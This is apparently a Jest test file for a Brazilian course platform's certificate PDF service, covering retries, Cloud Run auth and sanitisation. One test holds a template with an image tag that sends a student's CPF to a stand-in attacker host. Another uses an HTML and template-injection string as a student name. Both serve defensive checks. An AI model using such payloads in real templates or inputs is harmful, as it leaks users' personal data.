/// <reference types="jest" />
import { PdfService } from './pdf.service'

// Resposta HTTP duck-typed (evita depender de `Response` global no jest).
const resp = (status: number, body: Buffer | string) => ({
  ok: status >= 200 && status < 300,
  status,
  arrayBuffer: async () => (typeof body === 'string' ? Buffer.from(body) : body),
  text: async () => (typeof body === 'string' ? body : body.toString('latin1')),
})

const PDF = Buffer.concat([Buffer.from('%PDF-1.4\n'), Buffer.alloc(2000, 0x20)])

const certData = {
  studentName: 'Ana Souza',
  courseTitle: 'Introdução à IA',
  hours: 40,
  issuedAt: new Date('2026-07-02T12:00:00Z'),
  code: 'A1B2C3D4',
  qrDataUri: 'data:image/svg+xml;base64,PHN2Zz48L3N2Zz4=',
  verifyUrl: 'https://cursos.studiopilari.com.br/certificado/A1B2C3D4',
  cpf: '123.456.789-00',
}

// config sem K_SERVICE (fora do Cloud Run) e retry instantâneo.
const cfg = (over: Record<string, unknown> = {}) => {
  const values: Record<string, unknown> = { PDF_SYNTH_URL: 'https://pdfsynth.example', PDF_SYNTH_RETRY_MS: 0, ...over }
  return { get: (k: string): unknown => values[k] }
}
const makeService = (over?: Record<string, unknown>) => new PdfService(cfg(over) as never)

describe('PdfService (pdfSynth)', () => {
  const realFetch = global.fetch
  afterEach(() => {
    global.fetch = realFetch
    jest.restoreAllMocks()
  })

  it('recusa template com subrecurso externo SEM chamar o pdfSynth (ID-10: sandbox de rede)', async () => {
    const fetchMock = jest.fn(async () => resp(200, PDF))
    global.fetch = fetchMock as never
    const evil = '<html><img src="https://evil.example/pix?cpf={{ cpf }}"></html>'
    await expect(makeService().generate(certData, evil)).rejects.toThrow('sandbox de rede')
    expect(fetchMock).not.toHaveBeenCalled()
  })

  it('POSTa o payload no /render e devolve o buffer do PDF', async () => {
    const fetchMock = jest.fn(async () => resp(200, PDF))
    global.fetch = fetchMock as never

    const buf = await makeService().generate(certData)

    expect(buf.subarray(0, 5).toString()).toBe('%PDF-')
    const [url, init] = fetchMock.mock.calls[0] as unknown as [string, RequestInit]
    expect(url).toBe('https://pdfsynth.example/render')
    const payload = JSON.parse(init.body as string)
    expect(payload.options).toEqual({ pdf_a: true, paper_format: 'A4' })
    expect(payload.data.studentName).toBe('Ana Souza')
    expect(payload.data.cpf).toBe('123.456.789-00')
    expect(payload.data.hours).toBe('40')
    expect(payload.data.qrDataUri).toContain('data:image/svg+xml')
    expect(typeof payload.template_html).toBe('string')
    expect(payload.template_html.length).toBeGreaterThan(100)
  })

  it('higieniza nome/curso (remove < > { }) antes de enviar ao pdfSynth', async () => {
    const fetchMock = jest.fn(async () => resp(200, PDF))
    global.fetch = fetchMock as never

    await makeService().generate({ ...certData, studentName: 'Ana <img src=x>{{7*7}}', courseTitle: 'Curso </div>' })

    const [, init] = fetchMock.mock.calls[0] as unknown as [string, RequestInit]
    const payload = JSON.parse(init.body as string)
    expect(payload.data.studentName).not.toMatch(/[<>{}]/)
    expect(payload.data.courseTitle).not.toMatch(/[<>{}]/)
  })

  it('em Cloud Run (K_SERVICE): busca identity token e envia Authorization', async () => {
    const fetchMock = jest
      .fn()
      .mockResolvedValueOnce(resp(200, 'id-token-abc')) // metadata server
      .mockResolvedValueOnce(resp(200, PDF)) // render
    global.fetch = fetchMock as never

    await makeService({ K_SERVICE: 'pilari-academy' }).generate(certData)

    expect(String(fetchMock.mock.calls[0][0])).toContain('metadata.google.internal')
    const renderInit = fetchMock.mock.calls[1][1] as RequestInit
    expect((renderInit.headers as Record<string, string>).Authorization).toBe('Bearer id-token-abc')
  })

  it('retenta em 5xx e sucede na 2ª tentativa', async () => {
    const fetchMock = jest
      .fn()
      .mockResolvedValueOnce(resp(502, 'bad gateway'))
      .mockResolvedValueOnce(resp(200, PDF))
    global.fetch = fetchMock as never

    const buf = await makeService().generate(certData)

    expect(buf.length).toBeGreaterThan(1000)
    expect(fetchMock).toHaveBeenCalledTimes(2)
  })

  it('resposta não-PDF → erro', async () => {
    const fetchMock = jest.fn(async () => resp(200, '<html>nope</html>'))
    global.fetch = fetchMock as never
    await expect(makeService().generate(certData)).rejects.toThrow(/Falha ao gerar PDF/)
    expect(fetchMock).toHaveBeenCalledTimes(3)
  })

  it('4xx não retenta', async () => {
    const fetchMock = jest.fn(async () => resp(400, 'payload ruim'))
    global.fetch = fetchMock as never
    await expect(makeService().generate(certData)).rejects.toThrow(/400/)
    expect(fetchMock).toHaveBeenCalledTimes(1)
  })

  it('em Cloud Run: falha do metadata server rejeita generate', async () => {
    const fetchMock = jest
      .fn()
      .mockResolvedValueOnce(resp(500, 'boom')) // metadata server falha
    global.fetch = fetchMock as never

    await expect(makeService({ K_SERVICE: 'pilari-academy' }).generate(certData)).rejects.toThrow(/identity token/)
    expect(fetchMock).toHaveBeenCalledTimes(1)
  })
})
